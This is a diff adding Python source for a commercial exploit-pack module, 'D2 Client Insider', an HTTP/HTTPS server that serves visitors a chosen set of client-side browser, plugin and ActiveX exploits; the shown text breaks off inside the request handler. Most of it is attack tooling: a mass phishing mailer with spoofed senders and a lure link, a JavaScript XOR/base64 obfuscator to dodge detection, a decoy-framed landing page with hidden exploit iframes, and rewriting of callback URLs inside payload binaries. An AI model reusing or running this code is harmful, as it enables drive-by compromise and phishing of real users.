@@ -1,0 +1,1181 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys
+import time
+import thread
+import re
+import socket
+import select
+import base64
+import string
+import random
+import gobject
+import pygtk
+import smtplib
+import MimeWriter
+import mimetypes
+import mimetools
+import os
+import zipfile
+import glob
+import struct
+
+pygtk.require("2.0")
+import gtk
+import gtk.glade
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.spkproxy import header, body, MyConnection
+from canvasengine import WIN32MOSDEF, JAVASERVER, HTTPMOSDEF, HTTPSMOSDEF
+from libs.tlslite.api import *
+
+
+NAME = "D2 Client Insider"
+DESCRIPTION = "HTTP/HTTPS Server & Tools for automation of client side vulnerabilities exploitation"
+DOCUMENTATION = {}
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Servers"
+
+NOTES = """
+.\commandlineInterface.py -v 9 -p 81 -l 192.168.133.1
+.\exploits\httpserver2\httpserver2.py -O cmdline:1 -l 192.168.133.1 -d 81
+
+In the GUI you must choose the same interface for bind IP as the local IP in commandlineInterface.py and httpserver2.py
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+
+	self.clientsides = ["d2sec_realconsole", "d2sec_calistctrl", "d2sec_incredimail", "d2sec_myspace",
+			    "d2sec_wfica", "d2sec_mercury_spider", "d2sec_xupload", "d2sec_yahoomjb", 
+			    "d2sec_iprint",  "d2sec_inotes", "d2sec_real_wallclock", "d2sec_javaws",			    
+			    "d2sec_hpinfo", "d2sec_jetflext", "d2sec_vmware_vielib", "d2sec_pdwizard", 
+			    "d2sec_facebook", "d2sec_ms08_017", "d2sec_ms07_055", "d2sec_hprules", 
+			    "d2sec_kwedit", "d2sec_akamai", "d2sec_download", "d2sec_creative",
+			    "d2sec_gw7", "d2sec_activex", "d2sec_snpvw1", "d2sec_snpvw2", 
+			    "d2sec_ffmosdef", "d2sec_pdf", "d2sec_javaws2", "d2sec_msmask",
+			    "d2sec_officescan", "d2sec_webex", "d2sec_jnlp", "d2sec_applet", 
+			    "d2sec_hbdw", "d2sec_sapgui", "d2sec_operaxss", "d2sec_iprint2",
+			    "d2sec_works7", "d2sec_jinitiator", "d2sec_appstream", "d2sec_axloader",
+			    "d2sec_msiag", "d2sec_ampx", "d2sec_directshow", "d2sec_owc", "d2sec_ms09_043",
+			    "d2sec_emckeyhelp", "d2sec_emcpdi", "d2sec_altirisns", "d2sec_xupload2",
+			    "d2sec_emsmtp", "d2sec_altirisrc", "d2sec_iprint3", "d2sec_jretk", 
+			    "d2sec_ibmegath", "d2sec_inotes2", "d2sec_iprint4", "d2sec_tispro",
+			    "d2sec_javaws3", "d2sec_hpphoto", "d2sec_wmitools", "d2sec_recordclip",
+			    "d2sec_classloader", "d2sec_cddauri", "d2sec_realarcade", "d2sec_ciscoany",
+			    "d2sec_hpeasy", "d2sec_autovue", "d2sec_launchhelp", "d2sec_hpeasy2",
+			    "d2sec_intrust", "d2sec_isig", "d2sec_ciscoptz", "d2sec_net4switch",
+			    "d2sec_crazytalk", "d2sec_qp2", "d2sec_notesurl", "d2sec_emcaxd", 
+                "d2sec_emcaxwa", "d2sec_privagent", "d2sec_sssplt", "d2sec_ntr",
+                "d2sec_clearquest", "d2sec_gwcls", "d2sec_wibukey", "d2sec_xgo",
+                "d2sec_easeweftp", "d2sec_edraw", "d2sec_c1sizer", "d2sec_coao",
+                "d2sec_cwui", "d2sec_lrweb", "d2sec_micwa", "d2sec_indusoft",
+                "d2sec_solidedge", "d2sec_lrweb2", "d2sec_kingview", "d2sec_cw3d",
+                "d2sec_solarwinds", "d2sec_lorex", "d2sec_bwocxrun", "d2sec_webhmi", "d2sec_iconics",
+                "d2sec_teechart5", "d2sec_aoamp4", "d2sec_ipolis", "d2sec_tomsawyer",
+                "d2sec_honeywell", "d2sec_honeywell2", "d2sec_skincrafter", "d2sec_skincrafter2",
+                "d2sec_skincrafter3", "d2sec_smartviewer", "d2sec_wespsdk", "d2sec_wespsdk2",
+                "d2sec_opos", "d2sec_1clickac", "d2sec_tango", "d2sec_mdraw", "d2sec_vport",
+                "d2sec_f1book", "d2sec_fluke", "d2sec_iocomp", "d2sec_iocomp2",
+                "d2sec_axeditgrid", "d2sec_webclientprint", "d2sec_webclientprint2",
+                			    
+			    "acrobat_js", "ani_cursor", "ms06_055", "ms07_004", "ms06_057",
+			    "ms06_071", "ms07_051", "flash_duke", "acrobat_js3", "firefox_definesetter",
+			    "FoxitLaunchit", "acrobat_js4", "mosdef_activex", "acrobat_u3d_mesh",
+					"java_deserialize_win32", "sun_java_hsbparser", "acrobat_newplayer"]
+	
+	self.selectedexploits = []
+	self.exploitslist = {}
+		
+	self.bindip = "0.0.0.0"	
+	self.isNAT = False
+	self.fakeurl = ""
+	self.httpport = 80
+	self.httpsport = 443
+	self.cmdline = 0
+	self.cancel = 0		
+	self.withobfus = False
+	self.withssl = False
+	self.withfakeurl = True
+	self.sslcallback = None	
+	self.withfakeurl = True
+        self.name = NAME
+        
+        return
+
+
+    def getargs(self):
+        self.cmdline = int(self.argsDict.get("cmdline", self.cmdline))
+        
+        return
+
+
+    def clearall(self, widget):
+    	self.treeselection.unselect_all()
+    	return
+
+    	
+    def selectall(self, widget):
+    	self.treeselection.select_all()
+    	return
+
+
+    def activateobfus(self, widget):    	
+    	if (self.activateobfus.get_active()):    		
+    		self.withobfus = True
+    	else:    		
+    		self.withobfus = False    		
+    	return
+
+    	
+    def activatefakeurl(self, widget):    	
+    	if (self.activatefakeurl.get_active()):
+    		self.fakeurlentry.set_sensitive(True)
+    		self.withfakeurl = True
+    	else:
+    		self.fakeurlentry.set_sensitive(False)
+    		self.withfakeurl = False    		
+    	return
+
+    	
+    def activatessl(self, widget):    	
+    	if (self.activatessl.get_active()):
+    		self.sslport.set_sensitive(True)
+    		self.withssl = True
+    	else:
+    		self.sslport.set_sensitive(False)
+    		self.withssl = False    		
+    	return
+
+
+    def tofromfile(self, widget):    		    	    	    	
+    	dialog = gtk.FileChooserDialog("Choose file", None, gtk.FILE_CHOOSER_ACTION_OPEN, (gtk.STOCK_CANCEL, gtk.RESPONSE_CANCEL, gtk.STOCK_OPEN, gtk.RESPONSE_OK))	
+	self.dlg.set_modal(False)
+	self.mailerdlg.set_modal(False)
+	dialog.set_modal(True)
+	
+	filter = gtk.FileFilter()
+	filter.set_name("All files")
+	filter.add_pattern("*")
+	dialog.add_filter(filter)
+	
+	filter = gtk.FileFilter()
+	
+	response = dialog.run()
+
+	if response == gtk.RESPONSE_OK:
+		filename = dialog.get_filename()
+	    	self.tofileentry = self.wTree2.get_widget("tofileaddr")
+	    	self.tofileentry.set_text(filename)    	
+	
+	self.mailerdlg.set_modal(True)
+
+	dialog.destroy()    	
+    	
+    	return
+    	
+
+    def attachment(self, widget):    	
+    	dialog = gtk.FileChooserDialog("Choose file", None, gtk.FILE_CHOOSER_ACTION_OPEN, (gtk.STOCK_CANCEL, gtk.RESPONSE_CANCEL, gtk.STOCK_OPEN, gtk.RESPONSE_OK))	
+	self.dlg.set_modal(False)
+	self.mailerdlg.set_modal(False)
+	dialog.set_modal(True)
+	
+	filter = gtk.FileFilter()
+	filter.set_name("All files")
+	filter.add_pattern("*")
+	dialog.add_filter(filter)
+	
+	filter = gtk.FileFilter()
+	
+	response = dialog.run()
+
+	if response == gtk.RESPONSE_OK:
+		filename = dialog.get_filename()
+	    	self.tofileentry = self.wTree2.get_widget("attachment")
+	    	self.tofileentry.set_text(filename)    	
+	
+	self.mailerdlg.set_modal(True)
+
+	dialog.destroy()    	
+    	
+    	return
+
+    	
+    def sendmail(self, server='127.0.0.1', port=25, sender='', to='', subject='', text='', attachments=None):
+	message = StringIO.StringIO()
+	writer = MimeWriter.MimeWriter(message)
+	
+	toaddr = ", ".join(to)
+	
+	writer.addheader('To', toaddr)
+	writer.addheader('From', sender)
+	writer.addheader('Subject', subject)
+	writer.addheader('MIME-Version', '1.0')
+	
+	writer.startmultipartbody('mixed')
+		
+	part = writer.nextpart()
+	body = part.startbody('text/html')
+	part.flushheaders()
+	body.write(text)
+		
+	if attachments is not None:
+		for a in attachments:
+			filename = os.path.basename(a)
+			ctype, encoding = mimetypes.guess_type(a)
+			
+			if ctype is None:
+				ctype = 'application/octet-stream'
+				encoding = 'base64'
+			elif ctype == 'text/plain':
+				encoding = 'quoted-printable'
+			else:
+				encoding = 'base64'
+			
+			part = writer.nextpart()
+			part.addheader('Content-Transfer-Encoding', encoding)
+			body = part.startbody("%s; name=%s" % (ctype, filename))
+			mimetools.encode(open(a, 'rb'), body, encoding)
+		
+	writer.lastpart()		
+	
+	smtp = smtplib.SMTP(server, port)
+	smtp.set_debuglevel(1)
+	smtp.sendmail(sender, to, message.getvalue())
+	smtp.quit()
+	
+	return
+
+    def mailer(self, widget):    	
+
+        self.gladefile2 = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_clientinsider/dialog3.glade2"  
+	self.wTree2 = gtk.glade.XML(self.gladefile2) 
+	
+	dic = {"on_fromfile_clicked" : self.tofromfile,
+	       "on_attachment_clicked" : self.attachment}
+        
+        self.wTree2.signal_autoconnect(dic)
+	
+	self.mailerdlg = self.wTree2.get_widget("mailer_dialog")
+	self.mailerdlg.set_size_request(600, 300)
+	try:
+		self.mailerdlg.set_icon_from_file(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_clientinsider/d2.ico")
+	except:
+		pass
+
+	mailbodyentry = self.wTree2.get_widget("mailbody")
+	mailtextbuffer = mailbodyentry.get_buffer()
+	
+	model = self.iptext.get_model()
+	index = self.iptext.get_active()
+	serverip = model[index][0]	
+	
+	mailtextbuffer.set_text('<A href="http://' + serverip + '/">Click here</A>')
+	
+	# Start main dialog
+	result = self.mailerdlg.run()
+
+	if (result == gtk.RESPONSE_OK):	
+		toaddrs = []
+		
+		smtpserverentry = self.wTree2.get_widget("smtpserver")
+		smtpserver = smtpserverentry.get_text()
+		
+		smtpportentry = self.wTree2.get_widget("smtpport")
+		smtpport = smtpportentry.get_value_as_int()
+		
+		fromaddrentry = self.wTree2.get_widget("fromaddr")
+		fromaddr = fromaddrentry.get_text()
+
+		fromnameentry = self.wTree2.get_widget("fromname")
+		fromname = fromnameentry.get_text()
+		
+		toaddrentry = self.wTree2.get_widget("toaddr")
+		toaddr = toaddrentry.get_text()
+		
+		if not toaddr == "":
+			toaddrs.append(toaddr)
+			
+		tofileaddrentry = self.wTree2.get_widget("tofileaddr")
+		tofileaddr = tofileaddrentry.get_text()
+		
+		if not tofileaddr == "":
+			f = open(tofileaddr, "rb")
+			addrs = f.readlines()
+			f.close()						
+			
+			for a in addrs:			
+				b = a.strip()
+				
+				if len(b) == 0:
+					continue
+					 
+				toaddrs.append(b)							
+			
+		attachmententry = self.wTree2.get_widget("attachment")
+		attachment = attachmententry.get_text()
+
+		subjectentry = self.wTree2.get_widget("subject")
+		subject = subjectentry.get_text()
+		
+		mailbodyentry = self.wTree2.get_widget("mailbody")
+		mailtextbuffer = mailbodyentry.get_buffer()
+		mailbody = mailtextbuffer.get_text(mailtextbuffer.get_start_iter(), mailtextbuffer.get_end_iter())		
+		
+		mailfrom = '"' + fromname + '" <' + fromaddr + '>'
+		
+		self.mailerdlg.destroy()
+		
+		if attachment == "":
+			self.sendmail(smtpserver, smtpport, mailfrom, toaddrs, subject, mailbody, None)
+		else:
+			attachments = []
+			attachments.append(attachment)
+			self.sendmail(smtpserver, smtpport, mailfrom, toaddrs, subject, mailbody, attachments)
+			
+	else:
+		self.mailerdlg.destroy()		
+
+	self.dlg.set_modal(True)
+
+    	return
+
+    	    	
+    def createGUI(self):
+        
+        self.column_names = ['Code', 'CVE', 'Name']
+        
+        self.gladefile = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_clientinsider/dialog2.glade2"  
+	self.wTree = gtk.glade.XML(self.gladefile) 
+	
+	dic = {"on_clearall_clicked" : self.clearall, 
+	       "on_selectall_clicked" : self.selectall,
+	       "on_activatessl_toggled" : self.activatessl,
+	       "on_activatefakeurl_toggled" : self.activatefakeurl,
+	       "on_activateobfus_toggled" : self.activateobfus,
+	       "on_mailer_clicked" : self.mailer}
+        
+        self.wTree.signal_autoconnect(dic)
+	
+	self.dlg = self.wTree.get_widget("exploit_dialog")
+	self.dlg.set_size_request(600, 300)
+	try:
+		self.dlg.set_icon_from_file(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_clientinsider/d2.ico")
+	except:
+		pass
+	
+	self.treeview = self.wTree.get_widget("mytree")
+	self.treeList = gtk.ListStore(str, str, str)
+	self.treeview.set_model(self.treeList)
+	self.treeselection = self.treeview.get_selection()
+	self.treeselection.set_mode(gtk.SELECTION_MULTIPLE)
+	
+	self.column = [None] * len(self.column_names)
+		
+	self.column[0] = gtk.TreeViewColumn(self.column_names[0], gtk.CellRendererText(), text=0)
+        self.column[0].set_resizable(True)
+        self.column[0].set_sort_column_id(0)
+
+	self.column[1] = gtk.TreeViewColumn(self.column_names[1], gtk.CellRendererText(), text=1)
+        self.column[1].set_resizable(True)
+        self.column[1].set_sort_column_id(1)
+        
+        self.column[2] = gtk.TreeViewColumn(self.column_names[2], gtk.CellRendererText(), text=2)
+        self.column[2].set_resizable(True)
+        self.column[2].set_sort_column_id(1)
+                
+        self.treeview.append_column(self.column[0])
+        self.treeview.append_column(self.column[1])
+        self.treeview.append_column(self.column[2])
+
+	self.sslport = self.wTree.get_widget("httpsport")
+	self.sslport.set_sensitive(False)
+	
+	self.fakeurlentry = self.wTree.get_widget("fakeurl")
+	self.activatessl = self.wTree.get_widget("activatessl")
+	self.activatefakeurl = self.wTree.get_widget("activatefakeurl")
+	self.activateobfus = self.wTree.get_widget("activateobfus")
+		
+	for mod in self.clientsides:
+		try:
+			ret = self.engine.getModule(mod)
+			
+			if ret:
+				if ret.DOCUMENTATION.has_key("CVE Name"):
+					cve = ret.DOCUMENTATION["CVE Name"]
+				else:
+					cve = "Unknown"
+					
+				self.treeList.append([mod, cve, ret.NAME])
+		except:
+			continue
+			
+	# Get all IP interfaces
+	node = self.argsDict["passednodes"][0]
+        node.getallips()
+	iplist = node.interfaces.all_ips()
+
+	self.iptext = self.wTree.get_widget("comboip")	
+	store = gtk.ListStore(str)
+    
+	for ip in iplist:
+		store.append([ip])
+	
+	self.iptext.set_model(store)
+	
+	self.iptext.set_active(0)
+			
+	# Start main dialog
+	result = self.dlg.run()
+	
+	if (result == gtk.RESPONSE_OK):	
+		if (self.treeselection.count_selected_rows() > 0):		
+			model, paths = self.treeselection.get_selected_rows()		
+					
+			for p in paths:
+				iter = self.treeList.get_iter(p)
+				tmpExploit = model.get_value(iter, 0)
+				tmpCVE = model.get_value(iter, 1)
+				tmpName = model.get_value(iter, 2)
+				
+				# Fill selected exploits list				
+				self.selectedexploits.append(tmpExploit)
+					
+			model = self.iptext.get_model()
+			index = self.iptext.get_active()
+			self.bindip = model[index][0]
+					
+			if self.withfakeurl:	
+				self.fakeurl = self.fakeurlentry.get_text()			
+			
+			self.porttext = self.wTree.get_widget("httpport")
+			self.httpport = self.porttext.get_value_as_int()
+			self.httpsport = self.sslport.get_value_as_int()
+			self.cancel = 0
+		else:
+			self.log("[D2 LOG] - No exploit selected")
+			self.cancel = 1
+	else:
+		self.cancel = 1
+						
+	self.dlg.destroy()
+        
+	return
+
+
+    def do_gui_operation(self, function, *args, **kw):
+    	def idle_func():
+		gtk.gdk.threads_enter()
+	        try:
+	        	function(*args, **kw)		        	
+	              	return False
+		finally:			
+	        	gtk.gdk.threads_leave()
+	        	
+	gobject.idle_add(idle_func)
+
+
+    def random_alphanumeric(self, size=16):
+	return "".join([random.choice(string.letters) for x in range(size)])
+    
+    
+    def myxor(self, toxor, key):
+	output=""
+	
+	for c in range(0, len(toxor)):
+		output += chr(ord(toxor[c])^key)
+		
+	return output
+
+
+    def randspace(self, htmlfile, mychar):
+	myindex = 1
+	while (myindex > 0):
+		myindex = htmlfile.find(mychar, myindex)
+
+		if (myindex < 0):
+			break
+		
+		mynum = random.randint(1, 50)
+		htmlfile = htmlfile[:myindex] + htmlfile[myindex:].replace(mychar , mychar * mynum, 1)
+		myindex = myindex + mynum
+		
+	return htmlfile
+
+
+    def jsobfuscate(self, htmlfile):
+	# Random whitespace
+	htmlfile = self.randspace(htmlfile, " ")
+	htmlfile = self.randspace(htmlfile, "\n")
+		
+	# Random key
+	key = random.randint(0x01, 0xff)
+	
+	# XOR HTML
+	htmlxored = self.myxor(htmlfile, key)
+	
+	# Base64 encode xored HTML file
+	encodedhtml = base64.encodestring(htmlxored)	
+	encodedhtml = encodedhtml.strip()
+	encodedhtml = "encoded = \"" + encodedhtml
+	encodedhtml = encodedhtml.replace("\n", "\";\nencoded += \"")
+	encodedhtml += "\";"
+	
+	# Create new HTML file
+	newhtmlfile = """
+	<SCRIPT langage="javascript">
+	function myxor(input, key) {
+	   var output = "";      
+	   for (i=0;i<input.length;i++) {   	   	
+	   	output += String.fromCharCode(input.charCodeAt(i)^key);   
+	   }   
+	   return output;
+	}
+	function decode64(input) {
+	   var output = "";
+	   var chr1, chr2, chr3;
+	   var enc1, enc2, enc3, enc4;
+	   var i = 0;
+	   var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+	   input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
+	   do {
+	      enc1 = keyStr.indexOf(input.charAt(i++));
+	      enc2 = keyStr.indexOf(input.charAt(i++));
+	      enc3 = keyStr.indexOf(input.charAt(i++));
+	      enc4 = keyStr.indexOf(input.charAt(i++));
+	      chr1 = (enc1 << 2) | (enc2 >> 4);
+	      chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
+	      chr3 = ((enc3 & 3) << 6) | enc4;
+	      output = output + String.fromCharCode(chr1);
+	      if (enc3 != 64) {
+	         output = output + String.fromCharCode(chr2);
+	      }
+	      if (enc4 != 64) {
+	         output = output + String.fromCharCode(chr3);
+	      }
+	   } while (i < input.length);
+	   return output;
+	}
+	function mystarter()
+	{
+	ENCODEDHTMLFILE
+	decoded = decode64(encoded);
+	plaintext = myxor(decoded, XORKEY)
+	document.write(plaintext);
+	}
+	mystarter()
+	</SCRIPT>
+	"""
+	
+	newhtmlfile = newhtmlfile.replace("ENCODEDHTMLFILE", encodedhtml)
+	newhtmlfile = newhtmlfile.replace("XORKEY", "%d" % key)
+	
+	newhtmlfile = newhtmlfile.replace("myxor", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("input", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("output", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("decode64", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("decoded", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("encoded", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("plaintext", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("keyStr", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("chr1", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("chr2", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("chr3", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("enc1", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("enc2", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("enc3", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("enc4", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("key", self.random_alphanumeric(8))
+	newhtmlfile = newhtmlfile.replace("mystarter", self.random_alphanumeric(8))
+    	
+    	return newhtmlfile    	
+    	
+    	
+    def str_unicode(self, str):
+    	u = ""      
+
+    	for s in str:
+    		u += "\x00" + s
+
+    	return u
+        
+        
+    def zippy(self, path, archive, rootlen):
+    	paths = os.listdir(path)
+
+    	for p in paths:
+    		p = os.path.join(path, p)
+    		if os.path.isdir(p):
+    			self.zippy(p, archive, rootlen)
+    		else:
+    			archive.write(p, p[rootlen:])
+    	return
+
+
+    def zipit(self, path, archname, rootlen):
+    	archive = zipfile.ZipFile(archname, "w", zipfile.ZIP_DEFLATED)
+    	
+    	if os.path.isdir(path):
+    		self.zippy(path, archive, rootlen)
+    	else:
+    		archive.write(path)
+    		
+    	archive.close()
+
+
+    def decimalip(self, ip):
+    	return str(struct.unpack('!L',socket.inet_aton(ip))[0])
+
+
+    def removeall(self, path):
+
+    	if not os.path.isdir(path):
+    		return
+    
+    	files = os.listdir(path)
+
+    	for x in files:
+    		fullpath = os.path.join(path, x)
+    		
+    		if os.path.isfile(fullpath):
+    			os.remove(fullpath)
+    			
+    		elif os.path.isdir(fullpath):
+    			self.removeall(fullpath)
+    			os.rmdir(fullpath)
+            
+                    
+    def makesploit(self, clientheader, clientbody, ssl):
+
+	if ssl:
+		myport = self.httpsport
+	else:
+		myport = self.httpport
+	
+        h = header('SERVER')
+        b = body()
+
+	myheader = "".join(clientheader.data)	
+	mybody = "".join(clientbody.data)	
+	classname = ""	
+	
+	self.log("[D2 LOG] - Requested URL %s" % clientheader.URL)
+	
+	m = re.search('/[0-9]*/', clientheader.URL)
+	
+	if m:			
+		page = (clientheader.URL[m.start():m.end()]).strip()
+		num = int(page[1:-1])			
+		clientheader.URL = re.sub(page, "/", clientheader.URL)
+				
+		self.exploitslist[num].callback.port = myport		
+		self.exploitslist[num].url_num = num
+    		
+		if ssl:
+			self.exploitslist[num].useSSL = 1
+		else:
+			self.exploitslist[num].useSSL = 0
+			
+		tmph, tmpb = self.exploitslist[num].makesploit(clientheader, clientbody)
+		
+		# Replace static URL in response body with dynamic URL
+		if (len(tmpb.data) > 0):
+			
+			# Detect HTTP MOSDEF URL
+			if (not (tmpb.data[0].count("/" + self.bindip + "/w") or tmpb.data[0].count("/" + self.bindip + ":" + str(myport) + "/w"))) or (tmpb.data[0].count("/wcpp.exe")):
+				# Detect XPI file
+				if clientheader.URL.count(".xpi"):
+					tmpdir = "xpitmpdir"
+					xpifiltmp = "tmpfile.xpi"
+					
+					# Create temporary directory for XPI extracting
+					globalpath = os.getcwd() + "/" + tmpdir
+
+					if not os.path.isdir(globalpath):
+						os.mkdir(globalpath)
+					
+					globalpath += "/"
+
+					# Create temporary XPI file					
+					f = open(xpifiltmp, "wb")
+					f.write(tmpb.data[0])
+					f.close()
+					
+					# Extract XPI file
+					zip = zipfile.ZipFile(xpifiltmp, "r")					
+				 
+					for each in zip.namelist():
+						if not each.endswith('/'):
+							root, name = os.path.split(each)
+						
+						directory = os.path.normpath(os.path.join("", root))
+						directory = globalpath + directory 
+						
+						if not os.path.isdir(directory):
+							os.makedirs(directory)
+							
+						data = zip.read(each)
+						
+						# Detect and modify data in XPi file
+						if data.count("/" + self.bindip + ":" + str(myport)):
+							data = data.replace("/" + self.bindip + ":" + str(myport), "/" + self.bindip + ":" + str(myport) + "/" + str(num))
+						elif data.count("/" + self.bindip):
+							data = data.replace("/" + self.bindip, "/" + self.bindip + "/" + str(num))
+						
+						file(os.path.join(directory, name), "wb").write(data)
+										
+					zip.close()
+					
+					os.remove(xpifiltmp)
+					
+					# Create new modified XPI file
+					self.zipit(tmpdir, xpifiltmp, len(tmpdir) + 1)
+										
+					f = open(xpifiltmp, "rb")
+					tmpb.data[0] = f.read()					
+					f.close()
+					
+					os.remove(xpifiltmp)
+					self.removeall(tmpdir)
+					os.rmdir(tmpdir)
+					
+				elif clientheader.URL.count(".class"):	
+					classname = "http://%s/%s/app" % (self.decimalip(self.bindip), str(num))
+					tmpb.data[0] = tmpb.data[0][:808] + struct.pack("B", len(classname)) + classname + tmpb.data[0][809 + 25:]			                   									
+				
+				elif (tmpb.data[0]).count("/" + self.bindip + ":" + str(myport)):
+					tmpb.data[0] = (tmpb.data[0]).replace("/" + self.bindip + ":" + str(myport), "/" + self.bindip + ":" + str(myport) + "/" + str(num))
+					
+				else:
+					tmpb.data[0] = (tmpb.data[0]).replace("/" + self.bindip, "/" + self.bindip + "/" + str(num))
+
+				if ((tmpb.data[0]).count("/" + self.decimalip(self.bindip)) and not (clientheader.URL.count(".class"))):
+					tmpb.data[0] = (tmpb.data[0]).replace("/" + self.decimalip(self.bindip), "/" + self.decimalip(self.bindip) + "/" + str(num))					
+				
+				# Detect unicode string resource in binary
+				if (tmpb.data[0][0] == 'M' and tmpb.data[0][1] == 'Z'):
+					
+					# First case
+					staticurl = self.str_unicode("/" + self.bindip + ":" + str(myport))				
+					dynamicurl = self.str_unicode("/" + self.bindip + ":" + str(myport) + "/" + str(num))
+					
+					start = (tmpb.data[0]).find(staticurl)
+					lenindex = 0
+	        
+					if (start >= 0):												
+						if ( (tmpb.data[0])[start - 15] == '\x00' ):
+							newlen = ord((tmpb.data[0])[start - 13]) + 2
+							lenindex = 13
+							tmplen = (2 * newlen) - 12 - len(dynamicurl)
+						else:
+							newlen = ord((tmpb.data[0])[start - 15]) + 2
+							lenindex = 15
+							tmplen = (2 * newlen) - 14 - len(dynamicurl)
+													
+						newdata = (tmpb.data[0])[0:start-lenindex] + chr(newlen) + (tmpb.data[0])[start-lenindex+1:start] + dynamicurl + (tmpb.data[0])[start+len(staticurl):start+len(staticurl) + tmplen] + (tmpb.data[0])[start+len(staticurl) + tmplen + 4:]
+						tmpb.data[0] = newdata						
+						
+					# Second case
+					staticurl = self.str_unicode("/" + self.bindip)
+					dynamicurl = self.str_unicode("/" + self.bindip + "/" + str(num))
+					
+					start = (tmpb.data[0]).find(staticurl)
+					lenindex = 0
+	        
+					if (start >= 0):												
+						if ( (tmpb.data[0])[start - 15] == '\x00' ):
+							newlen = ord((tmpb.data[0])[start - 13]) + 2
+							lenindex = 13
+							tmplen = (2 * newlen) - 12 - len(dynamicurl)
+						else:
+							newlen = ord((tmpb.data[0])[start - 15]) + 2
+							lenindex = 15
+							tmplen = (2 * newlen) - 14 - len(dynamicurl)
+													
+						newdata = (tmpb.data[0])[0:start-lenindex] + chr(newlen) + (tmpb.data[0])[start-lenindex+1:start] + dynamicurl + (tmpb.data[0])[start+len(staticurl):start+len(staticurl) + tmplen] + (tmpb.data[0])[start+len(staticurl) + tmplen + 4:]
+						tmpb.data[0] = newdata						
+				
+			# Javascript obfuscation
+			if (self.withobfus):		
+				if ( (clientheader.URL.count(".htm")) and not (clientheader.URL.count("?")) ):					
+					tmpb.data[0] = self.jsobfuscate(tmpb.data[0])
+
+		h = tmph
+		b = tmpb		
+				
+		exploit = self.exploitslist[num]
+
+	elif clientheader.URL.count("index.html"):
+		self.log("[D2 LOG] - Creating start page")
+		
+		startPage = """
+		<HTML>
+		
+		  <FRAMESET frameborder="no" rows="0%, 100%">		    
+		    <FRAME noresize id="frame1" src="/sleep.html">
+		    <FRAME noresize id="frame2" src="FAKEURL">
+		  </FRAMESET>
+		
+		</HTML>
+		"""
+		
+		startPage = startPage.replace("FAKEURL", self.fakeurl)
+				
+		b.setBody(startPage)
+		exploit = self.exploitslist[0]			
+	
+	elif clientheader.URL.count("sleep.html"):
+		self.log("[D2 LOG] - Creating wait page")
+		
+		waitPage = """
+		<HTML>
+		  <HEAD>    
+		    <meta http-equiv="refresh" content="8; url=MAINURL"/>
+		  </HEAD>
+		</HTML>    			
+		"""
+		
+		if ssl:
+			waitPage = waitPage.replace("MAINURL", "https://" + self.bindip + ":" + str(myport) + "/main.html")
+		else:
+			waitPage = waitPage.replace("MAINURL", "http://" + self.bindip + ":" + str(myport) + "/main.html")					
+		
+		b.setBody(waitPage)
+		exploit = self.exploitslist[0]							
+		
+	elif clientheader.URL.count("main.html"):
+		self.log("[D2 LOG] - Creating main page")
+		
+		mainPage = ""
+		
+		for num, expl in self.exploitslist.iteritems():
+			if ssl:
+				mainPage += "<IFRAME SRC=\"https://" + self.bindip + ":" + str(myport) + "/" + str(num)+ "/index.html\" width=\"200\" height=\"200\"></IFRAME>\n" 
+			else:
+				mainPage += "<IFRAME SRC=\"http://" + self.bindip + ":" + str(myport) + "/" + str(num)+ "/index.html\" width=\"200\" height=\"200\"></IFRAME>\n" 
+			
+		b.setBody(mainPage)
+		exploit = self.exploitslist[0]
+				
+	else:	
+		h.status = '302'
+		h.addHeader('Location', "index.html")
+		h.addHeader('Content-Type', 'binary/octet-stream')
+		exploit = self.exploitslist[0]
+				
+	return h, b, exploit
+
+
+    def handle(self, infd, ssl, addr): 
+        
+        if ssl:
+        	myport = self.httpsport
+        else:
+        	myport = self.httpport
+        
+        conn = MyConnection(infd)
+        
+        if ssl:        	
+		connection = TLSConnection(conn)
+        	connection.closeSocket = True
+        	
+        	from engine.config import canvas_resources_directory
+        	cert_file = open(os.path.join(canvas_resources_directory, "server.cert"), "rb").read()
+        	x509 = X509()
+        	x509.parse(cert_file)
+        	certChain = X509CertChain([x509])
+        	ctx_file = open(os.path.join(canvas_resources_directory, "server.pkey"), "rb").read()
+        	private=parsePEMKey(ctx_file)
+        	
+        	try:
+            		connection.handshakeServer(certChain=certChain, privateKey=private)
+        	except:
+	            return
+		
+		conn = connection
+        	        	        	
+        clientheader = header(state = "SERVER")        
+        ret = clientheader.readdata(conn)
+        clientbody = body()
+        
+        if clientheader.gotGoodHeader():            
+            if ( (clientheader.bodySize() > 0) or (clientheader.wasChunked) ):                                
+                clientbody.read(conn, clientheader.bodySize(), clientheader.wasChunked, 0)                
+
